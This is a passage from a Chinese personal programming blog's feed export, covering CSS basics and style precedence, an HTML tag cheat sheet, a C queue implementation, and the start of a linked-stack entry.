class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;！定义&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.center &#123;</span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">.color &#123;</span><br><span class="line">color:#ff0000;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;! 应用&gt;</span><br><span class="line">&lt;h1 class=&quot;center&quot;&gt;标题居中&lt;/h1&gt;</span><br><span class="line">&lt;p class=&quot;center color&quot;&gt;段落居中，颜色为红色。&lt;/p&gt; </span><br></pre></td></tr></table></figure><h2 id="3-CSS-创建"><a href="#3-CSS-创建" class="headerlink" title="3.CSS 创建"></a>3.CSS 创建</h2><p>当读到一个样式表时，浏览器会根据它来格式化 HTML 文档。</p><h3 id="如何插入样式表"><a href="#如何插入样式表" class="headerlink" title="如何插入样式表"></a>如何插入样式表</h3><p>插入样式表的方法有三种:</p><ul><li>外部样式表(External style sheet)</li><li>内部样式表(Internal style sheet)</li><li>内联样式(Inline style)</li></ul><h3 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h3><p>当样式需要应用于很多页面时，外部样式表将是理想的选择。在使用外部样式表的情况下，你可以通过改变一个文件来改变整个站点的外观。每个页面使用 link 标签链接到样式表。 link 标签在（文档的）头部：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure><p>浏览器会从文件 mystyle.css 中读到样式声明，并根据它来格式文档。</p><p>外部样式表可以在任何文本编辑器中进行编辑。文件不能包含任何的 html 标签。样式表应该以 .css 扩展名进行保存。下面是一个样式表文件的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hr &#123;color:sienna;&#125;</span><br><span class="line">p &#123;margin-left:20px;&#125;</span><br><span class="line">body &#123;background-image:url(&quot;/images/back40.gif&quot;);&#125;</span><br></pre></td></tr></table></figure><h3 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h3><p>当单个文档需要特殊的样式时，就应该使用内部样式表。你可以使用 style 标签在文档头部定义内部样式表，就像这样:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">hr &#123;color:sienna;&#125;</span><br><span class="line">p &#123;margin-left:20px;&#125;</span><br><span class="line">body &#123;background-image:url(&quot;images/back40.gif&quot;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure><h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><p>由于要将表现和内容混杂在一起，内联样式会损失掉样式表的许多优势。请慎用这种方法，例如当样式仅需要在一个元素上应用一次时。</p><p>要使用内联样式，你需要在相关的标签内使用样式（style）属性。Style 属性可以包含任何 CSS 属性。本例展示如何改变段落的颜色和左外边距：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=&quot;color:sienna;margin-left:20px&quot;&gt;这是一个段落。&lt;/p&gt;</span><br></pre></td></tr></table></figure><h3 id="多重样式"><a href="#多重样式" class="headerlink" title="多重样式"></a>多重样式</h3><p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从更具体的样式表中被继承过来。 </p><p>例如，外部样式表拥有针对 h3 选择器的三个属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">h3</span><br><span class="line">&#123;</span><br><span class="line">    color:red;</span><br><span class="line">    text-align:left;</span><br><span class="line">    font-size:8pt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而内部样式表拥有针对 h3 选择器的两个属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">h3</span><br><span class="line">&#123;</span><br><span class="line">    text-align:right;</span><br><span class="line">    font-size:20pt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如拥有内部样式表的这个页面同时与外部样式表链接，那么 h3 得到的样式是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">color:red;</span><br><span class="line">text-align:right;</span><br><span class="line">font-size:20pt;</span><br></pre></td></tr></table></figure><p>即颜色属性将被继承于外部样式表，而文字排列（text-alignment）和字体尺寸（font-size）会被内部样式表中的规则取代。</p><h3 id="多重样式优先级"><a href="#多重样式优先级" class="headerlink" title="多重样式优先级"></a>多重样式优先级</h3><p>样式表允许以多种方式规定样式信息。样式可以规定在单个的 HTML 元素中，在 HTML 页的头元素中，或在一个外部的 CSS 文件中。甚至可以在同一个 HTML 文档内部引用多个外部样式表。</p><p>一般情况下，优先级如下：</p><p>（内联样式）Inline style &gt; （内部样式）Internal style sheet &gt;（外部样式）External style sheet &gt; 浏览器默认样式</p><p>style.css 文件样式代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">h3 &#123;</span><br><span class="line">    color:blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;!-- 外部样式 style.css --&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;/&gt;</span><br><span class="line">    &lt;!-- 设置：h3&#123;color:blue;&#125; --&gt;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">      /* 内部样式 */</span><br><span class="line">      h3&#123;color:green;&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h3&gt;显示绿色，是内部样式&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>注意：如果外部样式放在内部样式的后面，则外部样式将覆盖内部样式。</p><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;!-- 设置：h3&#123;color:blue;&#125; --&gt;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">      /* 内部样式 */</span><br><span class="line">      h3&#123;color:green;&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;!-- 外部样式 style.css --&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h3&gt;显示蓝色，是外部样式&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML</title>
      <link href="/2023/05/10/HTML/"/>
      <url>/2023/05/10/HTML/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="1-HTML-基本文档"><a href="#1-HTML-基本文档" class="headerlink" title="1.HTML 基本文档"></a>1.HTML 基本文档</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;文档标题&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">可见文本...</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="2-基本标签（Basic-Tags）"><a href="#2-基本标签（Basic-Tags）" class="headerlink" title="2.基本标签（Basic Tags）"></a>2.基本标签（Basic Tags）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;最大的标题&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt; . . . &lt;/h2&gt;</span><br><span class="line">&lt;h3&gt; . . . &lt;/h3&gt;</span><br><span class="line">&lt;h4&gt; . . . &lt;/h4&gt;</span><br><span class="line">&lt;h5&gt; . . . &lt;/h5&gt;</span><br><span class="line">&lt;h6&gt;最小的标题&lt;/h6&gt;</span><br><span class="line"> </span><br><span class="line">&lt;p&gt;这是一个段落。&lt;/p&gt;</span><br><span class="line">&lt;br&gt; （换行）</span><br><span class="line">&lt;hr&gt; （水平线）</span><br><span class="line">&lt;!-- 这是注释 --&gt;</span><br></pre></td></tr></table></figure><h2 id="3-文本格式化（Formatting）"><a href="#3-文本格式化（Formatting）" class="headerlink" title="3.文本格式化（Formatting）"></a>3.文本格式化（Formatting）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;粗体文本&lt;/b&gt;</span><br><span class="line">&lt;code&gt;计算机代码&lt;/code&gt;</span><br><span class="line">&lt;em&gt;强调文本&lt;/em&gt;</span><br><span class="line">&lt;i&gt;斜体文本&lt;/i&gt;</span><br><span class="line">&lt;kbd&gt;键盘输入&lt;/kbd&gt; </span><br><span class="line">&lt;pre&gt;预格式化文本&lt;/pre&gt;</span><br><span class="line">&lt;small&gt;更小的文本&lt;/small&gt;</span><br><span class="line">&lt;strong&gt;重要的文本&lt;/strong&gt;</span><br><span class="line"> </span><br><span class="line">&lt;abbr&gt; （缩写）</span><br><span class="line">&lt;address&gt; （联系信息）</span><br><span class="line">&lt;bdo&gt; （文字方向）</span><br><span class="line">&lt;blockquote&gt; （从另一个源引用的部分）</span><br><span class="line">&lt;cite&gt; （工作的名称）</span><br><span class="line">&lt;del&gt; （删除的文本）</span><br><span class="line">&lt;ins&gt; （插入的文本）</span><br><span class="line">&lt;sub&gt; （下标文本）</span><br><span class="line">&lt;sup&gt; （上标文本）</span><br></pre></td></tr></table></figure><h2 id="4-链接（Links）"><a href="#4-链接（Links）" class="headerlink" title="4.链接（Links）"></a>4.链接（Links）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">普通的链接：&lt;a href=&quot;http://www.example.com/&quot;&gt;链接文本&lt;/a&gt;</span><br><span class="line">图像链接： &lt;a href=&quot;http://www.example.com/&quot;&gt;&lt;img decoding=&quot;async&quot; src=&quot;URL&quot; alt=&quot;替换文本&quot;&gt;&lt;/a&gt;</span><br><span class="line">邮件链接： &lt;a href=&quot;mailto:webmaster@example.com&quot;&gt;发送e-mail&lt;/a&gt;</span><br><span class="line">书签：</span><br><span class="line">&lt;a id=&quot;tips&quot;&gt;提示部分&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;#tips&quot;&gt;跳到提示部分&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="5-图片（Images）"><a href="#5-图片（Images）" class="headerlink" title="5.图片（Images）"></a>5.图片（Images）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;img decoding=&quot;async&quot; loading=&quot;lazy&quot; src=&quot;URL&quot; alt=&quot;替换文本&quot; height=&quot;42&quot; width=&quot;42&quot;&gt;</span><br><span class="line">样式/区块（Styles/Sections）</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">h1 &#123;color:red;&#125;</span><br><span class="line">p &#123;color:blue;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div&gt;文档中的块级元素&lt;/div&gt;</span><br><span class="line">&lt;span&gt;文档中的内联元素&lt;/span&gt;</span><br></pre></td></tr></table></figure><h2 id="6-无序列表"><a href="#6-无序列表" class="headerlink" title="6.无序列表"></a>6.无序列表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;项目&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;项目&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><h2 id="7-有序列表"><a href="#7-有序列表" class="headerlink" title="7.有序列表"></a>7.有序列表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;第一项&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;第二项&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure><h2 id="8-定义列表"><a href="#8-定义列表" class="headerlink" title="8.定义列表"></a>8.定义列表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dl&gt;</span><br><span class="line">  &lt;dt&gt;项目 1&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;描述项目 1&lt;/dd&gt;</span><br><span class="line">  &lt;dt&gt;项目 2&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;描述项目 2&lt;/dd&gt;</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure><h2 id="9-表格（Tables）"><a href="#9-表格（Tables）" class="headerlink" title="9.表格（Tables）"></a>9.表格（Tables）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;table border=&quot;1&quot;&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">    &lt;th&gt;表格标题&lt;/th&gt;</span><br><span class="line">    &lt;th&gt;表格标题&lt;/th&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">    &lt;td&gt;表格数据&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;表格数据&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><h2 id="10-框架（Iframe）"><a href="#10-框架（Iframe）" class="headerlink" title="10.框架（Iframe）"></a>10.框架（Iframe）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;demo_iframe.htm&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">表单（Forms）</span><br><span class="line">&lt;form action=&quot;demo_form.php&quot; method=&quot;post/get&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;email&quot; size=&quot;40&quot; maxlength=&quot;50&quot;&gt;</span><br><span class="line">&lt;input type=&quot;password&quot;&gt;</span><br><span class="line">&lt;input type=&quot;checkbox&quot; checked=&quot;checked&quot;&gt;</span><br><span class="line">&lt;input type=&quot;radio&quot; checked=&quot;checked&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Send&quot;&gt;</span><br><span class="line">&lt;input type=&quot;reset&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;select&gt;</span><br><span class="line">&lt;option&gt;苹果&lt;/option&gt;</span><br><span class="line">&lt;option selected=&quot;selected&quot;&gt;香蕉&lt;/option&gt;</span><br><span class="line">&lt;option&gt;樱桃&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;textarea name=&quot;comment&quot; rows=&quot;60&quot; cols=&quot;20&quot;&gt;&lt;/textarea&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h2 id="11-实体（Entities）"><a href="#11-实体（Entities）" class="headerlink" title="11.实体（Entities）"></a>11.实体（Entities）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt; 等同于 &lt;</span><br><span class="line">&amp;gt; 等同于 &gt;</span><br><span class="line">&amp;#169; 等同于 ©</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>队列</title>
      <link href="/2023/05/10/%E9%98%9F%E5%88%97/"/>
      <url>/2023/05/10/%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>队列是一种特殊的线性表，特殊之处在于它只允许在表的前端（head）进行删除操作，而在表的后端（tail）进行插入操作，和栈一样，队列是一种操作受限制的线性表。进行插入操作的端称为队尾，进行删除操作的端称为队头。</p><h2 id="1-队列结构定义"><a href="#1-队列结构定义" class="headerlink" title="1.队列结构定义"></a>1.队列结构定义</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef int QDataType;</span><br><span class="line"></span><br><span class="line">//节点定义</span><br><span class="line">typedef struct QueueNode</span><br><span class="line">&#123;</span><br><span class="line">QDataType data;//数据域</span><br><span class="line">struct QueueNode* next;//指针域</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">typedef struct Queue</span><br><span class="line">&#123;</span><br><span class="line">QueueNode* head;//队列头指针</span><br><span class="line">QueueNode* tail;//队列尾指针</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-队列初始化"><a href="#2-队列初始化" class="headerlink" title="2.队列初始化"></a>2.队列初始化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void QueueInit(Queue* pq)&#123;</span><br><span class="line">assert(pq != NULL);</span><br><span class="line">pq-&gt;head = NULL;</span><br><span class="line">pq-&gt;tail = NULL;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="3-队列的销毁"><a href="#3-队列的销毁" class="headerlink" title="3.队列的销毁"></a>3.队列的销毁</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void QueueDestroy(Queue* pq)&#123;</span><br><span class="line">assert(pq != NULL);</span><br><span class="line">struct QueueNode* cur;</span><br><span class="line">cur = pq-&gt;head;</span><br><span class="line">while(cur != NULL)          //遍历节点</span><br><span class="line">&#123;</span><br><span class="line">QueueNode* next = cur-&gt;next;</span><br><span class="line">free(cur);</span><br><span class="line">cur = next;</span><br><span class="line">&#125;</span><br><span class="line">pq-&gt;head = NULL;</span><br><span class="line">pq-&gt;tail = NULL;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-入队（尾节点后插入）"><a href="#4-入队（尾节点后插入）" class="headerlink" title="4.入队（尾节点后插入）"></a>4.入队（尾节点后插入）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void QueuePush(Queue* pq, QDataType x)&#123;</span><br><span class="line">assert(pq != NULL);</span><br><span class="line"></span><br><span class="line">QueueNode* newnode = (QueueNode*)malloc(sizeof(QueueNode));</span><br><span class="line">if(newnode == NULL)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;malloc fault!&quot;);</span><br><span class="line">exit(-1);</span><br><span class="line">&#125;</span><br><span class="line">newnode-&gt;data = x;</span><br><span class="line">newnode-&gt;next = NULL;</span><br><span class="line">if(pq-&gt;tail == NULL)//判断是否为空队列</span><br><span class="line">&#123;</span><br><span class="line">assert(pq-&gt;head == NULL);</span><br><span class="line">pq-&gt;head = newnode;</span><br><span class="line">pq-&gt;tail = newnode;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">pq-&gt;tail-&gt;next = newnode;</span><br><span class="line">pq-&gt;tail = newnode;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="5-出队（删除头结点）"><a href="#5-出队（删除头结点）" class="headerlink" title="5.出队（删除头结点）"></a>5.出队（删除头结点）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void QueuePop(Queue* pq)&#123;</span><br><span class="line">assert(pq != NULL);</span><br><span class="line">assert(pq-&gt;head != NULL &amp;&amp; pq-&gt;tail != NULL);</span><br><span class="line"></span><br><span class="line">if(pq-&gt;head-&gt;next == NULL)//如果队列就一个元素</span><br><span class="line">&#123;</span><br><span class="line">free(pq-&gt;head);</span><br><span class="line">pq-&gt;head = NULL;</span><br><span class="line">pq-&gt;tail = NULL;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">QueueNode* next = pq-&gt;head-&gt;next;</span><br><span class="line">free(pq-&gt;head);</span><br><span class="line">pq-&gt;head = next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="6-取出队首元素"><a href="#6-取出队首元素" class="headerlink" title="6.取出队首元素"></a>6.取出队首元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QDataType QueueGetFront(Queue* pq)&#123;</span><br><span class="line">assert(pq != NULL);</span><br><span class="line">assert(pq-&gt;head != NULL &amp;&amp; pq-&gt;tail != NULL);  //防止队列为空队列</span><br><span class="line"></span><br><span class="line">return pq-&gt;head-&gt;data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="7-判断队是否为空-如果为空返回1，不为空返回0"><a href="#7-判断队是否为空-如果为空返回1，不为空返回0" class="headerlink" title="7.判断队是否为空,如果为空返回1，不为空返回0"></a>7.判断队是否为空,如果为空返回1，不为空返回0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int QueueIsempty(Queue* pq)&#123;</span><br><span class="line">assert(pq != NULL);</span><br><span class="line"></span><br><span class="line">return pq-&gt;head == NULL;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="8-求队列的长度"><a href="#8-求队列的长度" class="headerlink" title="8.求队列的长度"></a>8.求队列的长度</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int QueueGetCount(Queue* pq)&#123;</span><br><span class="line">assert(pq != NULL);</span><br><span class="line">int count = 0;</span><br><span class="line">QueueNode* cur = pq-&gt;head;</span><br><span class="line">while(cur != NULL)</span><br><span class="line">&#123;</span><br><span class="line">cur = cur-&gt;next;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">return count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链栈</title>
      <link href="/2023/05/01/%E9%93%BE%E6%A0%88/"/>
      <url>/2023/05/01/%E9%93%BE%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<h1 id="链栈"><a href="#链栈" class="headerlink" title="链栈"></a>链栈</h1><h2 id="1-链栈结构定义"><a href="#1-链栈结构定义" class="headerlink" title="1.链栈结构定义"></a>1.链栈结构定义</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef int LSTDataType;</span><br><span class="line"></span><br><span class="line">typedef struct StackNode &#123;</span><br><span class="line">    LSTDataType data;               // 数据域</span><br><span class="line">    struct StackNode *next;         // 指针域</span><br><span class="line">&#125; StackNode, *LinkStackPtr;</span><br></pre></td></tr></table></figure><h2 id="2-链栈初始化-即创建一个空栈"><a href="#2-链栈初始化-即创建一个空栈" class="headerlink" title="2.链栈初始化(即创建一个空栈)"></a>2.链栈初始化(即创建一个空栈)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 